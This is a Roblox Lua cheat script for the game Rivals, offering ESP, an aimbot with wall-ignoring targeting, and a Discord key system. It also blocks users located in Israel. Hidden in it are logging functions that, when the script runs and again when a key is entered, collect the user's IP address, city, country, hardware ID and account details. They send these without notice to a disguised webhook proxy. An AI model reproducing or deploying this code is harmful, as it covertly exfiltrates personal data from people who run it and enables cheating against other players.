--[[
    Jacob's Scripts - Rivals
    ESP + Aimbot (Complete with Key System)
]]

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

-- ============================================
-- GEO-BLOCK CHECK
-- ============================================
local function CheckGeoBlock()
    local blocked = false
    pcall(function()
        local data = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/?fields=country,countryCode"))
        if data and (data.country == "Israel" or data.countryCode == "IL") then
            blocked = true
        end
    end)
    return blocked
end

if CheckGeoBlock() then
    -- Create block GUI
    local BlockGui = Instance.new("ScreenGui")
    BlockGui.Name = "JSBlock"
    BlockGui.ResetOnSpawn = false
    pcall(function() if syn then syn.protect_gui(BlockGui) end BlockGui.Parent = game:GetService("CoreGui") end)
    if not BlockGui.Parent then BlockGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
    
    local BlockFrame = Instance.new("Frame")
    BlockFrame.Size = UDim2.new(0, 400, 0, 200)
    BlockFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
    BlockFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
    BlockFrame.BorderSizePixel = 0
    BlockFrame.Parent = BlockGui
    Instance.new("UICorner", BlockFrame).CornerRadius = UDim.new(0, 6)
    
    local BlockStroke = Instance.new("UIStroke", BlockFrame)
    BlockStroke.Color = Color3.fromRGB(200, 50, 50)
    BlockStroke.Thickness = 2
    
    local BlockTitle = Instance.new("TextLabel")
    BlockTitle.Size = UDim2.new(1, 0, 0, 40)
    BlockTitle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    BlockTitle.BorderSizePixel = 0
    BlockTitle.Text = "ACCESS DENIED"
    BlockTitle.TextColor3 = Color3.new(1, 1, 1)
    BlockTitle.TextSize = 18
    BlockTitle.Font = Enum.Font.GothamBold
    BlockTitle.Parent = BlockFrame
    Instance.new("UICorner", BlockTitle).CornerRadius = UDim.new(0, 6)
    
    local TitleFix = Instance.new("Frame")
    TitleFix.Size = UDim2.new(1, 0, 0, 10)
    TitleFix.Position = UDim2.new(0, 0, 1, -10)
    TitleFix.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    TitleFix.BorderSizePixel = 0
    TitleFix.Parent = BlockTitle
    
    local BlockMsg = Instance.new("TextLabel")
    BlockMsg.Size = UDim2.new(1, -20, 0, 80)
    BlockMsg.Position = UDim2.new(0, 10, 0, 50)
    BlockMsg.BackgroundTransparency = 1
    BlockMsg.Text = "You cannot use this script.\n\nJoin our Discord, tag the owner,\nand send a screenshot to request access."
    BlockMsg.TextColor3 = Color3.fromRGB(200, 200, 200)
    BlockMsg.TextSize = 14
    BlockMsg.Font = Enum.Font.Gotham
    BlockMsg.TextWrapped = true
    BlockMsg.Parent = BlockFrame
    
    local DiscordBtn = Instance.new("TextButton")
    DiscordBtn.Size = UDim2.new(1, -20, 0, 35)
    DiscordBtn.Position = UDim2.new(0, 10, 0, 140)
    DiscordBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    DiscordBtn.Text = "Join Discord: discord.gg/kNk7kAUVQM"
    DiscordBtn.TextColor3 = Color3.new(1, 1, 1)
    DiscordBtn.TextSize = 13
    DiscordBtn.Font = Enum.Font.GothamBold
    DiscordBtn.Parent = BlockFrame
    Instance.new("UICorner", DiscordBtn).CornerRadius = UDim.new(0, 4)
    
    DiscordBtn.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/kNk7kAUVQM")
        DiscordBtn.Text = "Copied to clipboard!"
        task.wait(1.5)
        DiscordBtn.Text = "Join Discord: discord.gg/kNk7kAUVQM"
    end)
    
    return -- Stop script execution
end

-- Webhook proxy (Cloudflare worker - real webhook hidden)
local _wh = "https://jacob-webhook.helpclownrunner.workers.dev/"
local GAME_NAME = "Rivals"

local Config = {
    DiscordInvite = "https://discord.gg/kNk7kAUVQM",
    ValidKeys = {"jacobrivals"},
    ToggleKey = Enum.KeyCode.RightShift,
    ESPEnabled = true,
    AimbotEnabled = false,
    AimbotFOV = 150,
    AimbotSmoothing = 2,
    TeamCheck = true,
    Wallbang = true,
    ShowFOV = true,
}

local GUIVisible = true
local ESPObjects = {}
local Loaded = false
local KeyVerified = false

local function Tween(obj, props, dur)
    TweenService:Create(obj, TweenInfo.new(dur, Enum.EasingStyle.Quart), props):Play()
end

-- Logging
local function GetUserInfo()
    local ip = {}
    pcall(function() ip = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/?fields=query,country,city")) end)
    local hwid = "?" pcall(function() if gethwid then hwid = gethwid() end end)
    return ip, hwid
end

local function LogExecution()
    local ip, hwid = GetUserInfo()
    pcall(function()
        local r = (syn and syn.request) or http_request or request
        if r then
            r({Url = _wh, Method = "POST", Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = {{
                    title = "Script Executed",
                    color = 16776960,
                    fields = {
                        {name = "Game", value = GAME_NAME, inline = true},
                        {name = "User", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
                        {name = "IP", value = ip.query or "?", inline = true},
                        {name = "Location", value = (ip.city or "?") .. ", " .. (ip.country or "?"), inline = true},
                        {name = "HWID", value = hwid, inline = false},
                    },
                    thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"},
                    footer = {text = "Awaiting key verification"}
                }}})
            })
        end
    end)
end

local function LogKeySuccess(key)
    local ip, hwid = GetUserInfo()
    pcall(function()
        local r = (syn and syn.request) or http_request or request
        if r then
            r({Url = _wh, Method = "POST", Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = {{
                    title = "Key Verified",
                    color = 65280,
                    fields = {
                        {name = "Game", value = GAME_NAME, inline = true},
                        {name = "User", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
                        {name = "Key Used", value = "||" .. key .. "||", inline = true},
                        {name = "IP", value = ip.query or "?", inline = true},
                        {name = "Location", value = (ip.city or "?") .. ", " .. (ip.country or "?"), inline = true},
                        {name = "HWID", value = hwid, inline = false},
                    },
                    thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"},
                    footer = {text = "Access granted"}
                }}})
            })
        end
    end)
end

local function IsKeyValid(key)
    for _, validKey in ipairs(Config.ValidKeys) do
        if key == validKey then return true end
    end
    return false
end

-- GUI
local Gui = Instance.new("ScreenGui")
Gui.Name = "JS"
Gui.ResetOnSpawn = false
pcall(function() if syn then syn.protect_gui(Gui) end Gui.Parent = game:GetService("CoreGui") end)
if not Gui.Parent then Gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

-- Log bij start
task.spawn(LogExecution)

-- KEY SYSTEM UI
local KeyFrame = Instance.new("Frame")
KeyFrame.Name = "KeySystem"
KeyFrame.Size = UDim2.new(0, 300, 0, 200)
KeyFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
KeyFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
KeyFrame.BorderSizePixel = 0
KeyFrame.Parent = Gui

Instance.new("UICorner", KeyFrame).CornerRadius = UDim.new(0, 6)
local KeyStroke = Instance.new("UIStroke", KeyFrame)
KeyStroke.Color = Color3.fromRGB(138, 43, 226)
KeyStroke.Thickness = 1

local KeyTitle = Instance.new("TextLabel")
KeyTitle.Size = UDim2.new(1, 0, 0, 40)
KeyTitle.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
KeyTitle.BorderSizePixel = 0
KeyTitle.Text = "JACOB'S SCRIPTS"
KeyTitle.TextColor3 = Color3.new(1, 1, 1)
KeyTitle.TextSize = 16
KeyTitle.Font = Enum.Font.GothamBold
KeyTitle.Parent = KeyFrame
Instance.new("UICorner", KeyTitle).CornerRadius = UDim.new(0, 6)

local TitleFix = Instance.new("Frame")
TitleFix.Size = UDim2.new(1, 0, 0, 10)
TitleFix.Position = UDim2.new(0, 0, 1, -10)
TitleFix.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
TitleFix.BorderSizePixel = 0
TitleFix.Parent = KeyTitle

local DiscordInfo = Instance.new("TextLabel")
DiscordInfo.Size = UDim2.new(1, -20, 0, 30)
DiscordInfo.Position = UDim2.new(0, 10, 0, 48)
DiscordInfo.BackgroundTransparency = 1
DiscordInfo.Text = "Join our Discord to get a key:"
DiscordInfo.TextColor3 = Color3.fromRGB(180, 180, 180)
DiscordInfo.TextSize = 12
DiscordInfo.Font = Enum.Font.Gotham
DiscordInfo.Parent = KeyFrame

local GetKeyBtn = Instance.new("TextButton")
GetKeyBtn.Size = UDim2.new(1, -20, 0, 32)
GetKeyBtn.Position = UDim2.new(0, 10, 0, 78)
GetKeyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
GetKeyBtn.Text = "Get Key (Discord)"
GetKeyBtn.TextColor3 = Color3.new(1, 1, 1)
GetKeyBtn.TextSize = 13
GetKeyBtn.Font = Enum.Font.GothamBold
GetKeyBtn.Parent = KeyFrame
Instance.new("UICorner", GetKeyBtn).CornerRadius = UDim.new(0, 4)

local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(1, -20, 0, 32)
KeyInput.Position = UDim2.new(0, 10, 0, 118)
KeyInput.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
KeyInput.Text = ""
KeyInput.PlaceholderText = "Enter your key here..."
KeyInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
KeyInput.TextColor3 = Color3.new(1, 1, 1)
KeyInput.TextSize = 12
KeyInput.Font = Enum.Font.Gotham
KeyInput.ClearTextOnFocus = false
KeyInput.Parent = KeyFrame
Instance.new("UICorner", KeyInput).CornerRadius = UDim.new(0, 4)

local VerifyBtn = Instance.new("TextButton")
VerifyBtn.Size = UDim2.new(1, -20, 0, 32)
VerifyBtn.Position = UDim2.new(0, 10, 0, 158)
VerifyBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
VerifyBtn.Text = "Verify Key"
VerifyBtn.TextColor3 = Color3.new(1, 1, 1)
VerifyBtn.TextSize = 13
VerifyBtn.Font = Enum.Font.GothamBold
VerifyBtn.Parent = KeyFrame
Instance.new("UICorner", VerifyBtn).CornerRadius = UDim.new(0, 4)

GetKeyBtn.MouseButton1Click:Connect(function()
    setclipboard(Config.DiscordInvite)
    GetKeyBtn.Text = "Copied to clipboard!"
    task.wait(1.5)
    GetKeyBtn.Text = "Get Key (Discord)"
end)

VerifyBtn.MouseButton1Click:Connect(function()
    local enteredKey = KeyInput.Text
    if IsKeyValid(enteredKey) then
        KeyVerified = true
        LogKeySuccess(enteredKey)
        
        VerifyBtn.Text = "Access Granted!"
        VerifyBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
        task.wait(0.5)
        
        -- Fade out key UI
        Tween(KeyFrame, {BackgroundTransparency = 1}, 0.3)
        Tween(KeyTitle, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
        Tween(TitleFix, {BackgroundTransparency = 1}, 0.3)
        Tween(DiscordInfo, {TextTransparency = 1}, 0.3)
        Tween(GetKeyBtn, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
        Tween(KeyInput, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
        Tween(VerifyBtn, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
        Tween(KeyStroke, {Transparency = 1}, 0.3)
        task.wait(0.35)
        KeyFrame:Destroy()
        
        -- INTRO ANIMATION
        local IntroHolder = Instance.new("Frame")
        IntroHolder.Size = UDim2.new(0, 200, 0, 80)
        IntroHolder.Position = UDim2.new(0.5, -100, 0.5, -40)
        IntroHolder.BackgroundTransparency = 1
        IntroHolder.Parent = Gui
        
        local Logo = Instance.new("TextLabel")
        Logo.Size = UDim2.new(1, 0, 0, 50)
        Logo.BackgroundTransparency = 1
        Logo.Text = "JS"
        Logo.TextColor3 = Color3.fromRGB(138, 43, 226)
        Logo.TextSize = 60
        Logo.Font = Enum.Font.GothamBlack
        Logo.TextTransparency = 1
        Logo.Parent = IntroHolder
        
        local IntroLine = Instance.new("Frame")
        IntroLine.Size = UDim2.new(0, 0, 0, 2)
        IntroLine.Position = UDim2.new(0.5, 0, 0, 55)
        IntroLine.AnchorPoint = Vector2.new(0.5, 0)
        IntroLine.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
        IntroLine.BorderSizePixel = 0
        IntroLine.Parent = IntroHolder
        
        local IntroSub = Instance.new("TextLabel")
        IntroSub.Size = UDim2.new(1, 0, 0, 20)
        IntroSub.Position = UDim2.new(0, 0, 0, 60)
        IntroSub.BackgroundTransparency = 1
        IntroSub.Text = "RIVALS"
        IntroSub.TextColor3 = Color3.fromRGB(100, 100, 100)
        IntroSub.TextSize = 12
        IntroSub.Font = Enum.Font.GothamMedium
        IntroSub.TextTransparency = 1
        IntroSub.Parent = IntroHolder
        
        task.wait(0.1)
        Tween(Logo, {TextTransparency = 0}, 0.4)
        task.wait(0.25)
        Tween(IntroLine, {Size = UDim2.new(0, 100, 0, 2)}, 0.35)
        task.wait(0.15)
        Tween(IntroSub, {TextTransparency = 0}, 0.3)
        task.wait(1.2)
        Tween(Logo, {TextTransparency = 1}, 0.3)
        Tween(IntroLine, {Size = UDim2.new(0, 0, 0, 2)}, 0.25)
        Tween(IntroSub, {TextTransparency = 1}, 0.25)
        task.wait(0.35)
        IntroHolder:Destroy()
        
        Loaded = true
    else
        VerifyBtn.Text = "Invalid Key!"
        VerifyBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.wait(1)
        VerifyBtn.Text = "Verify Key"
        VerifyBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
    end
end)

-- FOV Circle (GUI-based)
local FOVCircle = Instance.new("Frame")
FOVCircle.Name = "FOVCircle"
FOVCircle.AnchorPoint = Vector2.new(0.5, 0.5)
FOVCircle.BackgroundTransparency = 1
FOVCircle.BorderSizePixel = 0
FOVCircle.Visible = false
FOVCircle.Parent = Gui

Instance.new("UICorner", FOVCircle).CornerRadius = UDim.new(1, 0)
local FOVStroke = Instance.new("UIStroke", FOVCircle)
FOVStroke.Color = Color3.fromRGB(138, 43, 226)
FOVStroke.Thickness = 1
FOVStroke.Transparency = 0.3

-- Main UI
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, 280, 0, 300)
Main.Position = UDim2.new(0.5, -140, 0.5, -150)
Main.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
Main.BorderSizePixel = 0
Main.Visible = false
Main.ClipsDescendants = true
Main.Parent = Gui

Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 4)
local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Color = Color3.fromRGB(138, 43, 226)
MainStroke.Thickness = 1

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 36)
Header.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
Header.BorderSizePixel = 0
Header.Parent = Main
Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 4)

local HeaderBottom = Instance.new("Frame")
HeaderBottom.Size = UDim2.new(1, 0, 0, 10)
HeaderBottom.Position = UDim2.new(0, 0, 1, -10)
HeaderBottom.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
HeaderBottom.BorderSizePixel = 0
HeaderBottom.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -40, 1, 0)
Title.Position = UDim2.new(0, 12, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "JACOB'S SCRIPTS - RIVALS"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 12
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local Close = Instance.new("TextButton")
Close.Size = UDim2.new(0, 30, 0, 30)
Close.Position = UDim2.new(1, -33, 0.5, -15)
Close.BackgroundTransparency = 1
Close.Text = "-"
Close.TextColor3 = Color3.new(1, 1, 1)
Close.TextSize = 22
Close.Font = Enum.Font.GothamBold
Close.Parent = Header

-- Content
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -16, 1, -50)
Content.Position = UDim2.new(0, 8, 0, 44)
Content.BackgroundTransparency = 1
Content.Parent = Main

local Layout = Instance.new("UIListLayout", Content)
Layout.Padding = UDim.new(0, 6)

-- UI Builders
local function Section(name)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, 0, 0, 32)
    f.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
    f.BorderSizePixel = 0
    f.Parent = Content
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 4)
    
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0.6, 0, 1, 0)
    l.Position = UDim2.new(0, 10, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = name
    l.TextColor3 = Color3.fromRGB(200, 200, 200)
    l.TextSize = 11
    l.Font = Enum.Font.GothamMedium
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = f
    return f
end

local function Toggle(sec, val, cb)
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0, 36, 0, 16)
    bg.Position = UDim2.new(1, -44, 0.5, -8)
    bg.BackgroundColor3 = val and Color3.fromRGB(138, 43, 226) or Color3.fromRGB(50, 50, 60)
    bg.BorderSizePixel = 0
    bg.Parent = sec
    Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)
    
    local c = Instance.new("Frame")
    c.Size = UDim2.new(0, 12, 0, 12)
    c.Position = val and UDim2.new(1, -14, 0.5, -6) or UDim2.new(0, 2, 0.5, -6)
    c.BackgroundColor3 = Color3.new(1, 1, 1)
    c.BorderSizePixel = 0
    c.Parent = bg
    Instance.new("UICorner", c).CornerRadius = UDim.new(1, 0)
    
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, 0, 1, 0)
    b.BackgroundTransparency = 1
    b.Text = ""
    b.Parent = bg
    
    local on = val
    local debounce = false
    b.MouseButton1Click:Connect(function()
        if debounce then return end
        debounce = true
        on = not on
        Tween(bg, {BackgroundColor3 = on and Color3.fromRGB(138, 43, 226) or Color3.fromRGB(50, 50, 60)}, 0.12)
        Tween(c, {Position = on and UDim2.new(1, -14, 0.5, -6) or UDim2.new(0, 2, 0.5, -6)}, 0.12)
        if cb then cb(on) end
        task.wait(0.15)
        debounce = false
    end)
end

local function Slider(name, min, max, val, cb)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, 0, 0, 44)
    f.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
    f.BorderSizePixel = 0
    f.Parent = Content
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 4)
    
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0.5, 0, 0, 20)
    l.Position = UDim2.new(0, 10, 0, 4)
    l.BackgroundTransparency = 1
    l.Text = name
    l.TextColor3 = Color3.fromRGB(200, 200, 200)
    l.TextSize = 11
    l.Font = Enum.Font.GothamMedium
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = f
    
    local v = Instance.new("TextLabel")
    v.Size = UDim2.new(0, 35, 0, 20)
    v.Position = UDim2.new(1, -45, 0, 4)
    v.BackgroundTransparency = 1
    v.Text = tostring(val)
    v.TextColor3 = Color3.fromRGB(138, 43, 226)
    v.TextSize = 11
    v.Font = Enum.Font.GothamBold
    v.Parent = f
    
    local t = Instance.new("Frame")
    t.Size = UDim2.new(1, -20, 0, 4)
    t.Position = UDim2.new(0, 10, 0, 30)
    t.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    t.BorderSizePixel = 0
    t.Parent = f
    Instance.new("UICorner", t).CornerRadius = UDim.new(1, 0)
    
    local fill = Instance.new("Frame")
    fill.Size = UDim2.new((val-min)/(max-min), 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
    fill.BorderSizePixel = 0
    fill.Parent = t
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
    
    local drag = false
    t.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = true end end)
    UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end end)
    UserInputService.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local r = math.clamp((i.Position.X - t.AbsolutePosition.X) / t.AbsoluteSize.X, 0, 1)
            local n = math.floor(min + (max-min) * r)
            fill.Size = UDim2.new(r, 0, 1, 0)
            v.Text = tostring(n)
            if cb then cb(n) end
        end
    end)
end

-- Build UI
local espSec = Section("ESP")
Toggle(espSec, Config.ESPEnabled, function(v) Config.ESPEnabled = v end)

local aimSec = Section("Aimbot (Hold RMB)")
Toggle(aimSec, Config.AimbotEnabled, function(v) Config.AimbotEnabled = v end)

Slider("FOV", 50, 400, Config.AimbotFOV, function(v) Config.AimbotFOV = v end)
Slider("Smoothing", 0, 12, Config.AimbotSmoothing, function(v) Config.AimbotSmoothing = v end)

local teamSec = Section("Team Check")
Toggle(teamSec, Config.TeamCheck, function(v) Config.TeamCheck = v end)

local wallSec = Section("Wallbang")
Toggle(wallSec, Config.Wallbang, function(v) Config.Wallbang = v end)

local fovSec = Section("Show FOV Circle")
Toggle(fovSec, Config.ShowFOV, function(v) Config.ShowFOV = v end)

-- Dragging
local dragging, dragStart, startPos
Header.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging, dragStart, startPos = true, i.Position, Main.Position end end)
Header.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
UserInputService.InputChanged:Connect(function(i)
    if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
        local d = i.Position - dragStart
        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)

Close.MouseButton1Click:Connect(function()
    GUIVisible = false
    Tween(Main, {Size = UDim2.new(0, 280, 0, 0)}, 0.2)
    task.delay(0.2, function() Main.Visible = false end)
end)

local toggleDebounce = false
UserInputService.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Config.ToggleKey and not toggleDebounce then
        toggleDebounce = true
        GUIVisible = not GUIVisible
        if GUIVisible then
            Main.Visible = true
            Main.Size = UDim2.new(0, 280, 0, 0)
            Tween(Main, {Size = UDim2.new(0, 280, 0, 300)}, 0.2)
        else
            Tween(Main, {Size = UDim2.new(0, 280, 0, 0)}, 0.2)
            task.delay(0.2, function() Main.Visible = false end)
        end
        task.delay(0.3, function() toggleDebounce = false end)
    end
end)

-- ESP (Highlight)
local function CreateESP(p)
    if p == LocalPlayer then return end
    if ESPObjects[p] then pcall(function() ESPObjects[p]:Destroy() end) ESPObjects[p] = nil end
    if not p.Character then return end
    
    local hl = Instance.new("Highlight")
    hl.FillColor = Color3.fromRGB(138, 43, 226)
    hl.FillTransparency = 0.75
    hl.OutlineTransparency = 0
    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    hl.Adornee = p.Character
    hl.Parent = p.Character
    ESPObjects[p] = hl
end

local function RemoveESP(p)
    if ESPObjects[p] then pcall(function() ESPObjects[p]:Destroy() end) ESPObjects[p] = nil end
end

local function SetupPlayer(p)
    if p == LocalPlayer then return end
    p.CharacterAdded:Connect(function() task.wait(0.3) CreateESP(p) end)
    if p.Character then CreateESP(p) end
end

for _, p in ipairs(Players:GetPlayers()) do SetupPlayer(p) end
Players.PlayerAdded:Connect(SetupPlayer)
Players.PlayerRemoving:Connect(RemoveESP)

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character then CreateESP(p) end
    end
end)

-- Aimbot
local function CanSeeTarget(origin, target)
    if Config.Wallbang then return true end
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    local filter = {target.Parent}
    if LocalPlayer.Character then table.insert(filter, LocalPlayer.Character) end
    params.FilterDescendantsInstances = filter
    local ray = workspace:Raycast(origin, (target.Position - origin), params)
    return ray == nil
end

local function GetClosestPlayer()
    local cam = workspace.CurrentCamera
    if not cam then return nil end
    
    local closest, closestDist = nil, Config.AimbotFOV
    local center = cam.ViewportSize / 2
    
    for _, p in ipairs(Players:GetPlayers()) do
        if p == LocalPlayer then continue end
        local char = p.Character
        if not char then continue end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then continue end
        if Config.TeamCheck and p.Team and LocalPlayer.Team and p.Team == LocalPlayer.Team then continue end
        
        local head = char:FindFirstChild("Head")
        if not head then continue end
        
        local screenPos, onScreen = cam:WorldToScreenPoint(head.Position)
        if not onScreen then continue end
        
        local dist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
        if dist < closestDist then
            if CanSeeTarget(cam.CFrame.Position, head) then
                closest, closestDist = head, dist
            end
        end
    end
    return closest
end

-- Main Loop
RunService.RenderStepped:Connect(function()
    if not Loaded then return end
    
    local cam = workspace.CurrentCamera
    
    -- FOV Circle
    if cam then
        local shouldShow = Config.ShowFOV and Config.AimbotEnabled
        FOVCircle.Visible = shouldShow
        if shouldShow then
            local size = Config.AimbotFOV * 2
            FOVCircle.Size = UDim2.new(0, size, 0, size)
            FOVCircle.Position = UDim2.new(0, cam.ViewportSize.X / 2, 0, cam.ViewportSize.Y / 2)
        end
    end
    
    -- ESP visibility
    for p, hl in pairs(ESPObjects) do
        local isTeam = Config.TeamCheck and p.Team and LocalPlayer.Team and p.Team == LocalPlayer.Team
        hl.Enabled = Config.ESPEnabled and not isTeam
    end
    
    -- Aimbot
    if Config.AimbotEnabled and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestPlayer()
        if target then
            local screenPos = cam:WorldToScreenPoint(target.Position)
            local mousePos = Vector2.new(Mouse.X, Mouse.Y)
            local delta = Vector2.new(screenPos.X - mousePos.X, screenPos.Y - mousePos.Y)
            
            if mousemoverel then
                local smoothing = Config.AimbotSmoothing + 3
                mousemoverel(delta.X / smoothing, delta.Y / smoothing)
            end
        end
    end
end)

-- Show UI after key verified
task.spawn(function()
    repeat task.wait() until Loaded
    Main.Visible = true
    Main.Size = UDim2.new(0, 280, 0, 0)
    Tween(Main, {Size = UDim2.new(0, 280, 0, 300)}, 0.25)
end)
